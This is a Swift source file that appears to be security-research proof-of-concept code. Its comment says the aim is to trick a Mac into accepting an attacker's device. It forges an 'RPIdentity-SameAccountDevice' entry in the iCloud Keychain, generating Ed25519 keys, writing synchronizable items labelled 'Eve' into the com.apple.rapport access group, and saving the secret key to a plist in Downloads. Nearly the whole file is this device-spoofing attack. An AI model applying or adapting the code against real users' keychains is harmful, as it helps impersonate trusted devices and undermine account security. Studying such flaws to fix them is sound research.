import Foundation
import Security

struct MacKeychainController {

    /// RPIdentities are used in the iCloud Keychain to identify devices which belong to this user. These identities can normally not be modified, but it may be possible to add an RPIdentity-SameAccountDevice to trick the Mac into accepting a new device.
    static func createNewRPIdentityItem() throws {

        // Insert an item into the com.apple.rapport security group
        try self.insertIdentityItem(withLabel: "Eve", accessGroup: "com.apple.rapport", uuid: UUID())

        // Insert an item without a security group
        try self.insertIdentityItem(withLabel: "Eve's little brother", accessGroup: nil, uuid: UUID())
    }

    static func insertIdentityItem(withLabel label: String, accessGroup: String?, uuid: UUID) throws {
        // Check if item exits. Do not items with the same label
        guard checkIfIdentityItemExists(withLabel: label, accessGroup: accessGroup) == false else {return}

        // Generate a new Signing Key Pair
        let signingKeyPair = KeyGeneration.generateEd25519SigningKeys()

        let service = "RPIdentity-SameAccountDevice"

        let valueData = [
            "edPK": signingKeyPair.edPublicKey,
            "dIRK": "<e94ea576 f7519d5d 1b9f8070 5708fb65>".hexadecimal!
        ]
        // Encode the value data
        let encoded = try OPACKCoding.encode(fromDictionary: valueData)

        var attributes: [String: Any] = [
            kSecAttrService as String: service,
            kSecAttrAccount as String: uuid.uuidString,
            kSecClass as String: kSecClassGenericPassword,
            kSecAttrSynchronizable as String: true,
            kSecAttrLabel as String: label,
            kSecAttrSyncViewHint as String: "Home",
            "pdmn": "cku",
            "tomb": 0,
            kSecValueData as String: encoded
        ]

        if let accessGroup = accessGroup {
                attributes[kSecAttrAccessGroup as String] = accessGroup
        }

        print("Writing to iCloud Keychain")
        let status = SecItemAdd(attributes as CFDictionary, nil)

        guard status == errSecSuccess else {throw NSError(domain: NSOSStatusErrorDomain, code: Int(status), userInfo: nil)}
        print("Write was successful")

        // Has been saved to keychain
        // Write all information to a file
        attributes["edPK"] = signingKeyPair.edPublicKey
        attributes["edSK"] = signingKeyPair.edSecretKey

        // Create Plist Data
        let plist = try PropertyListSerialization.data(fromPropertyList: attributes, format: .xml, options: .init())

        // Write to file
        var homeDir = FileManager.default.homeDirectoryForCurrentUser
        homeDir.appendPathComponent("/Downloads/RPIdentity-Generated-\(label).plist")
        try plist.write(to: homeDir)

        print("Created file with key information at \(homeDir.path)")
    }

    static func checkIfIdentityItemExists(withLabel label: String, accessGroup: String?) -> Bool {

        let service = "RPIdentity-SameAccountDevice"
        var query: [String: Any] = [
            kSecAttrService as String: service,
            kSecClass as String: kSecClassGenericPassword,
            kSecAttrSynchronizable as String: true,
            kSecAttrLabel as String: label,
            kSecReturnAttributes as String: true
        ]

        if let accessGroup = accessGroup {
            query[kSecAttrAccessGroup as String] = accessGroup
        }

        var item: CFTypeRef?
        let status = SecItemCopyMatching(query as CFDictionary, &item)

        return status == errSecSuccess
    }
}
